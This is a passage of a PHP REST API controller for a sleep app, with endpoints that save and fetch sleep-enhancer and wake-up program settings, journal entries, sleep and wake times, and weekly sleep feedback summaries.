                    "program_id" => isset($_POST['program_id']) ? $_POST['program_id'] : "False",
                    "duration_id" => isset($_POST['duration_id']) ? $_POST['duration_id'] : "False",
                    "video_id" => isset($_POST['video_id']) ? $_POST['video_id'] : "False",
                    "user_id" => $_POST['user_id']               
                );
                $response = array(
                    "status" => TRUE,
                    "msg" => "Activity saved successfully",
                    "result" => $insertArr
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, something went wrong",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function saved_get_to_sleep_post() {
        if ($_POST['user_id']) {
            $data = $this->ApiModel->get_saved_get_to_sleep($_POST['user_id']);
            if ($data) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Get to sleep saved data",
                    "result" => [
                        "gender_id" => (($data[0]['gender_id'] == 'None') ? 'False' :$data[0]['gender_id']),
                        "duration_id" => (($data[0]['duration_id'] == 'None') ? 'False' :$data[0]['duration_id']),
                        "program_id" => (($data[0]['program_id'] == 'None') ? 'False' :$data[0]['program_id']),
                        "video_id" => (($data[0]['video_id'] == 'None') ? 'False' :$data[0]['video_id'])
                    ]
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, no data found",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, user_id missing",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function get_sleep_enhancer_programs_post() {
        
        if ($_POST['user_id']) {
            $programList = $this->ApiModel->get_sleep_enhancer_programs();
            if ($programList) {
                $listArr = [];
                $counter = 0;
                $get_to_sleep_saved = $this->ApiModel->get_sleep_enhancer_saved_data($_POST['user_id']);
                foreach ($programList as $list) {
                    $listArr[$counter]['id'] = $list['id'];
                    $listArr[$counter]['program_name'] = $list['program_name'];
                    $listArr[$counter]['thumb'] = $list['thumb'];
                    if ($get_to_sleep_saved) {
                        $listArr[$counter++]['is_active'] = ((($get_to_sleep_saved[0]['program_1'] == $list['id']) || ($get_to_sleep_saved[0]['program_2'] == $list['id']))? 1:0);
                    } else {
                        $listArr[$counter++]['is_active'] = 0;
                    }
                }
                $response = array(
                    "status" => TRUE,
                    "msg" => "Sleep enahncer program List",
                    "result" => [
                        "list" => $listArr
                    ]
                    );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, no data found",
                    "result" => new stdClass()
                    );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass()
                );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function sleep_enhancer_post() {
        if ($_POST['program'] && $_POST['duration'] && $_POST['user_id']) {
            // $language = $this->get_user_language($_POST['user_id']);
            $list = $this->ApiModel->get_sleep_enhancer($_POST['program'], $_POST['duration']);
            $savedData = $this->ApiModel->get_sleep_enhancer_saver_audio($_POST['user_id']);
            if ($list) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Sleep enhancer list",
                    "result" => ["list" => $list, "saved_audios" => (($savedData == false)? []:$savedData), "base_url_mp3" => base_url("uploads/mp3/"), "base_url_media" => base_url("uploads/thumb/")]
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, no data found",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function sleep_enhancer_saver_post() {
          $insertArr = array();
    
        if (isset($_POST['user_id'])) {
            $insertArr = array(
                "t_1" => isset($_POST['t_1']) ? $_POST['t_1'] : "None",
                "t_2" => isset($_POST['t_2']) ? $_POST['t_2'] : "None",
                "duration_1" => isset($_POST['duration_1']) ? $_POST['duration_1'] : "None",
                "duration_2" => isset($_POST['duration_2']) ? $_POST['duration_2'] : "None",
                "program_1" => isset($_POST['program_1']) ? $_POST['program_1'] : "None",
                "program_2" => isset($_POST['program_2']) ? $_POST['program_2'] : "None",
                "audio_1" => isset($_POST['audio_1']) ? $_POST['audio_1'] : "None",
                "audio_2" => isset($_POST['audio_2']) ? $_POST['audio_2'] : "None",
                "volume" => isset($_POST['volume']) ? $_POST['volume'] : "None",
                "user_id" => $_POST['user_id'],
                "created_at" => date("Y-m-d H:i:s")
            );
    
            if ($this->ApiModel->save_sleep_enhancer($insertArr)) {
                $insertArr = array(
                "t_1" => isset($_POST['t_1']) ? $_POST['t_1'] : "False",
                "t_2" => isset($_POST['t_2']) ? $_POST['t_2'] : "False",
                "duration_1" => isset($_POST['duration_1']) ? $_POST['duration_1'] : "False",
                "duration_2" => isset($_POST['duration_2']) ? $_POST['duration_2'] : "False",
                "program_1" => isset($_POST['program_1']) ? $_POST['program_1'] : "False",
                "program_2" => isset($_POST['program_2']) ? $_POST['program_2'] : "False",
                "audio_1" => isset($_POST['audio_1']) ? $_POST['audio_1'] : "False",
                "audio_2" => isset($_POST['audio_2']) ? $_POST['audio_2'] : "False",
                "volume" => isset($_POST['volume']) ? $_POST['volume'] : "False",
                "user_id" => $_POST['user_id']
            );
                $response = array(
                    "status" => TRUE,
                    "msg" => "Activity saved successfully",
                    "result" => $insertArr
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, something went wrong",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass() 
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function saved_sleep_enhancer_post() {
        if ($_POST['user_id']) {
            $data = $this->ApiModel->get_saved_sleep_enhancer($_POST['user_id']);
            if ($data) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Saved sleep enhancer data",
                    "result" => [
                        "t_1" => (($data[0]['t_1'] == 'None') ? 'False' :$data[0]['t_1']),
                        "t_2" => (($data[0]['t_2'] == 'None') ? 'False' :$data[0]['t_2']),
                        "duration_1" => (($data[0]['duration_1'] == 'None') ? 'False' :$data[0]['duration_1']),
                        "duration_2" => (($data[0]['duration_2'] == 'None') ? 'False': $data[0]['duration_2']),
                        "program_1" => (($data[0]['program_1'] == 'None') ? 'False': $data[0]['program_1']),
                        "program_2" => (($data[0]['program_2'] == 'None') ? 'False': $data[0]['program_2']),
                        "audio_1" => (($data[0]['audio_1'] == 'None') ? 'False': $data[0]['audio_1']),
                        "audio_2" => (($data[0]['audio_2'] == 'None') ? 'False': $data[0]['audio_2']),
                        "volume" => (($data[0]['volume'] == 'None') ? 'False': $data[0]['volume']),
                        "user_id" => $data[0]['user_id']
                    ]
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, something went wrong",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, user_id missing",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

	public function getYoutubeDetailsByLink_GET() {
		//Getting data form db
		
		if (isset($_GET["language_id"])) {
		    
		    $categoryData = $this->ApiModel->getCategoryDataForLibrary();
		    
		    if ($categoryData) {
		        
		        $mainCounter = 0;
    		    foreach ($categoryData as $cData) {
    		        
    		        $data[$mainCounter]["category_name"] = $cData["category_name"];
    		        
    		        $urlsArr = $this->ApiModel->getLibraryMgmt_Links($_GET["language_id"], $cData["id"]);
            		if ($urlsArr) {
            			$ydata = array();
            			$counter = 0;
            			foreach ($urlsArr as $value) {
            				$youtube = "https://www.youtube.com/oembed?url=". $value['link'] ."&format=json";
             				$curl = curl_init($youtube);
             				curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
             				$return = curl_exec($curl);
             				curl_close($curl);
             				$ydata[$counter] = json_decode($return, true); 	
            				$ydata[$counter]['mainlink'] = $value['link'];
            				$ydata[$counter]["mainThumbnail"] = base_url('uploads/thumb/').$value["thumbName"];
            				$ydata[$counter]['article_name'] = $value['article_name'];
            				$ydata[$counter++]['article_link'] = $value['article_link'];
            			}
            		    $data[$mainCounter]["list"] = $ydata;
            		    unset($ydata);
            		}
            		
                    $mainCounter++;
    		        
    		    }
		        
		        $response = [
		            "status" => TRUE,
		            "msg" => "YT Data",
		            "result" => $data
		        ];
		    } else {
		        $response = [
		            "status" => FALSE,
		            "msg" => "No Data Found",
		            "result" => new stdClass()
		        ];
		    }
		    
		} else {
		    $response = [
    	        "status" => FALSE,
                "msg" => "Oops!, language id missing",
    			'result' => new stdClass()
    		]; 
		}
		
		

		$this->response($response, REST_Controller::HTTP_OK);
	}
	
	
	public function save_sleep_activity_post() {
        if (isset($_POST['user_id']) && isset($_POST['sleep_time']) && isset($_POST['wake_up_time'])) {
	        
	        $insertArr = [
	            "user_id" => $_POST["user_id"],
	            "sleep_time" => $_POST["sleep_time"],
	            "wake_up_time" => $_POST["wake_up_time"],
	            "created_at" => date("Y-m-d H:i:s")
	        ];
	        $status = $this->ApiModel->save_sleep_activity_for_feedback($insertArr);
	        if ($status) {
	            $response = [
	                "status" => TRUE,
	                "msg" => "sleep activity saved successfully",
	                "result" => new stdClass()
	           ];
	        } else {
	            $response = [
	                "status" => FALSE,
	                "msg" => "Something went wrong",
	                "result" => new stdClass()
	            ];
	        }
	        
	    } else {
            $response = [
	            "status" => FALSE,
	            "msg" => "Oops!, not proper input",
	            "result" => new stdClass()
	        ];
	    }
	    
	    $this->response($response, REST_Controller::HTTP_OK);
	}

    public function get_journal_post() {
        if ($_POST['user_id']) {
            $list = $this->ApiModel->get_journal($_POST['user_id']);
            if ($list) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "journal list",
                    "result" => ["list" => $list]
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, no data found",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, user_id missing",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function get_single_journal_post() {
        if ($_POST['id']) {
            $data = $this->ApiModel->get_single_journal($_POST['id']);
            if ($data) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "journal data",
                    "result" => [
                        "id" => $data[0]['id'],
                        "title" => $data[0]['title'],
                        "content" => $data[0]['content'],
                        "saved_at" => $data[0]['saved_at']
                    ]
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, no data found",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, id missing",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function insert_journal_post() {
        if ($_POST['title'] && $_POST['content'] && $_POST['user_id']) {
            $insertArr = array(
                "title" => $_POST['title'],
                "content" => $_POST['content'],
                "user_id" => $_POST['user_id'],
                "saved_at" => date("Y-m-d")
            );
            if ($this->ApiModel->save_journal($insertArr)) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Journal saved successfully",
                    "result" => [
                        "title" => $_POST['title'],
                        "content" => $_POST['content'],
                        "user_id" => $_POST['user_id'],
                        "saved_at" => date("Y-m-d")
                    ]
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, something went wrong",
                    "result" => []
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function edit_journal_post() {
        if ($_POST['title'] && $_POST['content'] && $_POST['id']) {
            $updateArr = array(
                "title" => $_POST['title'],
                "content" => $_POST['content'],
            );
            if ($this->ApiModel->edit_journal($updateArr, $_POST['id'])) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Journal edited successfully",
                    "result" => [
                        "id" => $_POST['id'],
                        "title" => $_POST['title'],
                        "content" => $_POST['content'],
                    ]
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, something went wrong",
                    "result" => []
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function delete_journal_post() {
        if ($_POST['id']) {
            
            if ($this->ApiModel->delete_journal($_POST['id'])) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Journal deleted successfully",
                    "result" => new stdClass()
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, something went wrong",
                    "result" => []
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }
    
    /*
    * Save Sleep & Wakeup
    */
    
    // public function sleep_action_activity_post() {
        
    //     if (isset($_POST['user_id']) && isset($_POST['action_type'])) {
    //         if ($_POST['action_type'] == 'sleep') {
    //             if (isset($_POST['sleep_time']) && isset($_POST['sleep_module_id'])) {
    //                 //check if action is for update
    //                 $feedback_data = $this->ApiModel->get_sleep_activiy_action_data($_POST['user_id']);
    //                 $insert_stat = 1;
    //                 if ($feedback_data) {
    //                     $last_wakeup = new DateTime($feedback_data[count($feedback_data)-1]['wakeup_time']);
    //                     $current_sleep_time = new DateTime($_POST['sleep_time']);
    //                     if ($last_wakeup >= $current_sleep_time) {
    //                         $insert_stat = 0;   
    //                     }
    //                 }
                    
    //                 if ($insert_stat == 1) {
    //                     $sleep_save_arr = array(
    //                         "user_id" => $_POST['user_id'],
    //                         "sleep_time" => $_POST['sleep_time'],
    //                         "sleep_module_id" => $_POST['sleep_module_id'],
    //                         "sleep_module_name" => "sleep_enhancer",
    //                         "created_at" => date('Y-m-d H:i:s')
    //                     );
    //                     if ($this->ApiModel->save_sleep_action_activity($sleep_save_arr)) {
    //                         $response = array(
    //                             "status" => TRUE,
    //                             "msg" => "Saved Successfully!!",
    //                             "result" => new stdClass()
    //                         );
    //                     } else {
    //                         $response = array(
    //                             "status" => FALSE,
    //                             "msg" => "Something went wrong",
    //                             "result" => new stdClass()
    //                         );
    //                     }    
    //                 } else {
    //                     $sleep_save_arr = array(
    //                         "sleep_time" => $_POST['sleep_time'],
    //                         "sleep_module_id" => $_POST['sleep_module_id'],
    //                         "sleep_module_name" => "sleep_enhancer"
    //                     );
    //                     if ($this->ApiModel->update_sleep_action_activity($sleep_save_arr, $feedback_data[count($feedback_data)-1]['id'])) {
    //                         $response = array(
    //                             "status" => TRUE,
    //                             "msg" => "Saved Successfully!!",
    //                             "result" => new stdClass()
    //                         );
    //                     } else {
    //                         $response = array(
    //                             "status" => FALSE,
    //                             "msg" => "Something went wrong",
    //                             "result" => new stdClass()
    //                         );
    //                     }  
    //                 }
    //             } else {
    //                 $response = array(
    //                     "status" => FALSE,
    //                     "msg" => "sleep_time or sleep_module_id missing!!",
    //                     "result" => new stdClass()
    //                 );
    //             }
    //         } else if ($_POST['action_type'] == 'wakeup') {
    //             if (isset($_POST['wakeup_time']) && isset($_POST['wakeup_module_id'])) {
                    
    //                 //check if action is for insert
                    
    //                 $wakeup_save_arr = array(
    //                     "wakeup_time" => $_POST['wakeup_time'],
    //                     "wakeup_module_id" => $_POST['wakeup_module_id'],
    //                     "wakeup_module_name" => "wakeup"
    //                 );
    //                 if ($this->ApiModel->save_wakeup_acion_activity($wakeup_save_arr, $_POST['user_id'])) {
    //                     $response = array(
    //                         "status" => TRUE,
    //                         "msg" => "Saved Successfully!!",
    //                         "result" => new stdClass()
    //                     );
    //                 } else {
    //                     $response = array(
    //                         "status" => FALSE,
    //                         "msg" => "Something went wrong",
    //                         "result" => new stdClass()
    //                     );
    //                 }
    //             } else {
    //                 $response = array(
    //                     "status" => FALSE,
    //                     "msg" => "wakeup_time or wkaeup_module_id missing!!",
    //                     "result" => new stdClass()
    //                 );
    //             }
    //         } else {
    //             $response = array(
    //                 "status" => FALSE,
    //                 "msg" => "Wrong action!!",
    //                 "result" => new stdClass()
    //             );
    //         }
    //     } else {
    //         $response = array(
    //             "status" => FALSE,
    //             "msg" => "Oops!, fields missing",
    //             "result" => new stdClass()
    //         );
    //     }
        
    //     $this->response($response, REST_Controller::HTTP_OK);
        
    // }
    
    
    public function sleep_activity_saver_post() {
        if (isset($_POST['user_id']) && isset($_POST['sleep_time'])) {
            
            $sleepExists = $this->ApiModel->fetch_sleep_activity($_POST['user_id'], $_POST['sleep_time']);
            if ($sleepExists) {
                
                $sleep_arr = array(
                    "sleep_time" => $_POST['sleep_time']
                );
                if ($this->ApiModel->update_sleep($sleep_arr, $sleepExists['id'])) {
                    $response = array(
                        "status" => TRUE,
                        "msg" => "Saved Successfully",
                        "result" => new stdClass()
                    );
                } else {
                    $response = array(
                        "status" => FALSE,
                        "msg" => "Something went wrong!!",
                        "result" => new stdClass()
                    );
                }
                
            } else {
                
                $sleep_arr = array(
                    "user_id" => $_POST['user_id'],
                    "sleep_time" => $_POST['sleep_time'],
                    "created_at" => date("Y-m-d H:i:s")
                );
                if ($this->ApiModel->save_sleep($sleep_arr)) {
                    $response = array(
                        "status" => TRUE,
                        "msg" => "Saved Successfully",
                        "result" => new stdClass()
                    );
                } else {
                    $response = array(
                        "status" => FALSE,
                        "msg" => "Something went wrong!!",
                        "result" => new stdClass()
                    );
                }
                   
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass()
            );
        }
        
        $this->response($response, REST_Controller::HTTP_OK);
        
    }
    
    public function wakeup_activity_saver_post() {
        if (isset($_POST['user_id']) && isset($_POST['wakeup_time']) && isset($_POST['module_id'])) {
            $wakeup_arr = array(
                "user_id" => $_POST['user_id'],
                "wakeup_time" => $_POST['wakeup_time'],
                "module_id" => $_POST['module_id'],
                "created_at" => date("Y-m-d H:i:s")
            );
            if ($this->ApiModel->save_wakeup($wakeup_arr)) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Saved Successfully",
                    "result" => new stdClass()
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Something went wrong!!",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass()
            );
        }
        
        $this->response($response, REST_Controller::HTTP_OK);
        
    }
    
    
    // public function save_sleep_activity_post() {
    //     if (isset($_POST['user_id']) && isset($_POST['time_for']) && isset($_POST['recorded_time']) && isset($_POST['activity_on']) && isset($_POST['module_name']) && isset($_POST['module_id'])) { 
    //         $sleep_activity_data = $this->ApiModel->check_if_sleep_activity_exists($_POST['user_id']);
    //         if (($sleep_activity_data) && ($sleep_activity_data[count($sleep_activity_data) - 1]["time_for"] == $_POST["time_for"])) {
    //             $response = array(
    //                 "status" => FALSE,
    //                 "msg" => $_POST["time_for"]." already recorded!!",
    //                 "result" => new stdClass()
    //             );
    //         } else {
    //             $insert_arr_sleep = array(
    //                 "user_id" => $_POST['user_id'],
    //                 "time_for" => $_POST['time_for'],
    //                 "recorded_time" => $_POST['recorded_time'],
    //                 "activity_on" => $_POST['activity_on'],
    //                 "module_name" => $_POST['module_name'],
    //                 "module_id" => $_POST['module_id']
    //             );
                
    //             $user_data = $this->ApiModel->get_user_info($_POST['user_id']);
                
    //             if ($user_data) {
                    
    //                 if ($_POST['time_for'] == "sleep") {
    //                     $module_data = $this->ApiModel->get_sleep_enhancer_by_id($_POST['module_id']);
                        
    //                     $insert_arr_feedback = array(
    //                         "user_info" => $_POST['user_id'],
    //                         "age" => $user_data[0]['age_group_id'],
    //                         "sex" => $user_data[0]['gender_id'],
    //                         "program_1" => $module_data[0]['custom_file_name'],
    //                         "duration_1" => $_POST['activity_on'].' '.$_POST['recorded_time'],
    //                         "day" => date('l'),
    //                         "created_at" => date("Y-m-d H:i:s")
    //                     );
                        
    //                     if (($this->ApiModel->save_sleep_activity($insert_arr_sleep)) && ($this->ApiModel->save_sleep_activity_feedback($insert_arr_feedback))) {
    //                         $response = array(
    //                             "status" => TRUE,
    //                             "msg" => "Activity saved successfully",
    //                             "result" => new stdClass()
    //                         );
    //                     } else {
    //                         $response = array(
    //                             "status" => FALSE,
    //                             "msg" => "Oops!, something went wrong",
    //                             "result" => new stdClass()
    //                         );
    //                     }    
    //                 } else {
    //                     $module_data = $this->ApiModel->get_wake_up_by_id($_POST['module_id']);
    //                     $feedback_data = $this->ApiModel->get_feedback_last($_POST['user_id']);
                        
    //                     if ($feedback_data) {
                            
    //                         $update_arr_feedback = array(
    //                             "program_2" => $module_data[0]['main_custom_name'],
    //                             "duration_2" => $_POST['activity_on'].' '.$_POST['recorded_time']
    //                         );
                            
    //                         if (($this->ApiModel->save_sleep_activity($insert_arr_sleep)) && ($this->ApiModel->update_sleep_activity_feedback($update_arr_feedback, $feedback_data[0]['id']))) {
    //                             $response = array(
    //                                 "status" => TRUE,
    //                                 "msg" => "Activity saved successfully",
    //                                 "result" => new stdClass()
    //                             );
    //                         } else {
    //                             $response = array(
    //                                 "status" => FALSE,
    //                                 "msg" => "Oops!, something went wrong",
    //                                 "result" => new stdClass()
    //                             );
    //                         }
                               
    //                     } else {
    //                         $response = array(
    //                             "status" => FALSE,
    //                             "msg" => "Oops!, data not availabel",
    //                             "result" => new stdClass()
    //                         );
    //                     }
    //                 }
                        
    //             } else {
    //                 $response = array(
    //                     "status" => FALSE,
    //                     "msg" => "Oops!, data not availabel",
    //                     "result" => new stdClass()
    //                 );
    //             }
    //         }
    //     } else {
    //         $response = array(
    //             "status" => FALSE,
    //             "msg" => "Oops!, fields missing",
    //             "result" => new stdClass()
    //         );
    //     }
    //     $this->response($response, REST_Controller::HTTP_OK);
    // }
    
    // public function save_sleep_activity_post() {
    //     if (isset($_POST['user_id']) && isset($_POST['time_for']) && isset($_POST['recorded_time']) && isset($_POST['activity_on']) && isset($_POST['module_name']) && isset($_POST['module_id'])) {
            
    //         if ($this->ApiModel->check_if_sleep_activity_exists($_POST['user_id'], $_POST['time_for'], $_POST['activity_on'])) {
    //             $response = array(
    //                 "status" => FALSE,
    //                 "msg" => "Oops!, activity already exists",
    //                 "result" => new stdClass()
    //             );
    //         } else {
    //             $insert_arr = array(
    //                 "user_id" => $_POST['user_id'],
    //                 "time_for" => $_POST['time_for'],
    //                 "recorded_time" => $_POST['recorded_time'],
    //                 "activity_on" => $_POST['activity_on'],
    //                 "module_name" => $_POST['module_name'],
    //                 "module_id" => $_POST['module_id']
    //             ); 
    //             if ($this->ApiModel->save_sleep_activity($insert_arr)) {
    //                 $response = array(
    //                     "status" => TRUE,
    //                     "msg" => "Activity saved successfully",
    //                     "result" => new stdClass()
    //                 );
    //             } else {
    //                 $response = array(
    //                     "status" => FALSE,
    //                     "msg" => "Oops!, something went wrong",
    //                     "result" => new stdClass()
    //                 );
    //             }
    //         }
    //     } else {
    //         $response = array(
    //             "status" => FALSE,
    //             "msg" => "Oops!, fields missing",
    //             "result" => new stdClass()
    //         );
    //     }

    //     $this->response($response, REST_Controller::HTTP_OK);
    // }

    public function feedback_details_post() {
        if (isset($_POST['user_id'])) {
            
            $period = new DatePeriod(
                new DateTime('2023-01-01'),
                new DateInterval('P1D'),
                new DateTime(date('Y-m-d'))
            );
            
            $mainArr = array();
            $tempTime = 0;
            $weekCounter = 0;
            $counter = 0;
            foreach ($period as $key => $value) {
                $sleep_data = $this->ApiModel->getSleepActivityData_by_filter($_POST['user_id'], 'sleep', $value->format('Y-m-d'));
                if ($sleep_data) {
                    $wake_up_data = $this->ApiModel->getSleepActivityData_by_filter($_POST['user_id'], 'wake_up', date("Y-m-d", strtotime($value->format('Y-m-d')."+1 day")));
                    if ($wake_up_data) {
                        $tempTime += date('H', strtotime($sleep_data[0]['activity_on'].' '.$sleep_data[0]['recorded_time'])) - date('H', strtotime($wake_up_data[0]['activity_on'].' '.$wake_up_data[0]['recorded_time']));
                        if ($weekCounter == 0) {
                            $startDate = $value->format('Y-m-d');
                        } else {
                            $endDate = $value->format('Y-m-d');
                        }
                        
                        $weekCounter++;
                    }
                }
                
                if ($weekCounter == 7) {
                    $mainArr[$counter++] = array(
                        "startDate" => $startDate,
                        "endDate" => $endDate,
                        "totalSlept" => $tempTime,
                        "cycleCount" => ($tempTime*60)/45
                        );
                    $weekCounter = 0;
                }
            }
            if ($weekCounter < 7) {
                $mainArr[$counter++] = array(
                        "startDate" => $startDate,
                        "endDate" => $endDate,
                        "totalSlept" => $tempTime,
                        "cycleCount" => ($tempTime*60)/45
                        );
            }
            
            
            if (count($mainArr) > 0) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Feedback data list",
                    "result" => ['list' => $mainArr]
                );
            } else {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Oops!, no data found",
                    "result" => new stdClass()
                );
            }
            
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, user_id missing",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }
    
    public function single_feedback_details_post() {
        if (isset($_POST['user_id']) && isset($_POST['date_from']) && isset($_POST['date_to'])) {
            
            
            $period = new DatePeriod(
                new DateTime($_POST['date_from']),
                new DateInterval('P1D'),
                new DateTime($_POST['date_to'])
            );
            
            $counter = 0;
            foreach ($period as $key => $value) {
                $sleep_data = $this->ApiModel->getSleepActivityData_by_filter($_POST['user_id'], 'sleep', $value->format('Y-m-d'));
                if ($sleep_data) {
                    $wake_up_data = $this->ApiModel->getSleepActivityData_by_filter($_POST['user_id'], 'wake_up', date("Y-m-d", strtotime($value->format('Y-m-d')."+1 day")));
                    if ($wake_up_data) {
                        $tempTime = date('H', strtotime($sleep_data[0]['activity_on'].' '.$sleep_data[0]['recorded_time'])) - date('H', strtotime($wake_up_data[0]['activity_on'].' '.$wake_up_data[0]['recorded_time']));
                        $mainArr[$counter]["forDate"] = $value->format('Y-m-d');
                        $mainArr[$counter]["program_1"] = "C/Yellow";
                        $mainArr[$counter]["duration_1"] = "10 minutes";
                        $mainArr[$counter]["program_2"] = "D/Red";
                        $mainArr[$counter]["duration_2"] = "20 minutes";
                        $mainArr[$counter]["day"] = date("F", strtotime($sleep_data[0]['activity_on'].' '.$sleep_data[0]['recorded_time']));
                        $mainArr[$counter]["totalSlept"] = $tempTime;
                        $mainArr[$counter++]["cycleCount"] = ceil(($tempTime*60)/45);
                    }
                }
            }
            
            
            if (count($mainArr) > 0) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Feedback details",
                    "result" => $mainArr
                );
            } else {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Oops!, no data found",
                    "result" => new stdClass()
                );
            }
            
            
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass()
                );
        }
        
        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function wake_up_programs_post() {
        if ($_POST['user_id']) {
            $programList = $this->ApiModel->get_wake_up_programs($_POST['user_id']);
            if ($programList) {
                $listArr = [];
                $counter = 0;
                $wake_up_saved = $this->ApiModel->get_wake_up_saved_data($_POST['user_id']);
                foreach ($programList as $list) {
                    $listArr[$counter]['id'] = $list['id'];
                    $listArr[$counter]['program_name'] = $list['program_name'];
                    $listArr[$counter]['thumb'] = $list['thumb'];
                    if ($wake_up_saved) {
                        $listArr[$counter++]['selected'] = (($wake_up_saved[0]['program'] == $list['id'])? 1:0);
                    } else {
                        $listArr[$counter++]['selected'] = 0;
                    }
                }
                $response = array(
                    "status" => TRUE,
                    "msg" => "Wake Up program List",
                    "result" => [
                        "list" => $listArr
                    ]
                    );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, no data found",
                    "result" => new stdClass()
                    );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass()
                );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function wake_up_list_post() {
     
        if ($_POST['gender'] && $_POST['program'] && $_POST['user_id']) {
           
            $language = $this->get_user_language($_POST['user_id']);
            
            $list = $this->ApiModel->get_wake_up_data($_POST['gender'], $_POST['program'], $language);
        
            $saved_list = $this->ApiModel->get_wake_up_saved_media($_POST['user_id']);
            if ($list) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Wake Up data list",
                    "result" => ["list" => $list, "saved_list" => $saved_list, "base_url_image" => base_url("uploads/thumb/"), "base_url_video" => base_url("uploads/video")]
                );
            } else {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Oops!, no data found",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function wake_up_saver_post() {
         $insert_arr = array();
        
        if ($_POST['user_id']) {
            $insert_arr = array(
                "gender" => isset($_POST['gender']) ? $_POST['gender'] : "None",
                "program" => isset($_POST['program']) ? $_POST['program'] : "None",
                "thumbURL" => isset($_POST['thumbURL']) ? $_POST['thumbURL'] : "None",
                "videoURL" => isset($_POST['videoURL']) ? $_POST['videoURL'] : "None",
                "time" => isset($_POST['time']) ? $_POST['time'] : "None",
                "repeatDays" => isset($_POST['repeatDays']) ? $_POST['repeatDays'] : "None",
                "user_id" => $_POST['user_id'],
                "created_at" => date("Y-m-d H:i:s")
            );
            if ($this->ApiModel->saveWakeUp($insert_arr)) {
                $insert_arr = array(
                    "gender" => isset($_POST['gender']) ? $_POST['gender'] : "False",
                    "program" => isset($_POST['program']) ? $_POST['program'] : "False",
                    "thumbURL" => isset($_POST['thumbURL']) ? $_POST['thumbURL'] : "False",
                    "videoURL" => isset($_POST['videoURL']) ? $_POST['videoURL'] : "False",
                    "time" => isset($_POST['time']) ? $_POST['time'] : "False",
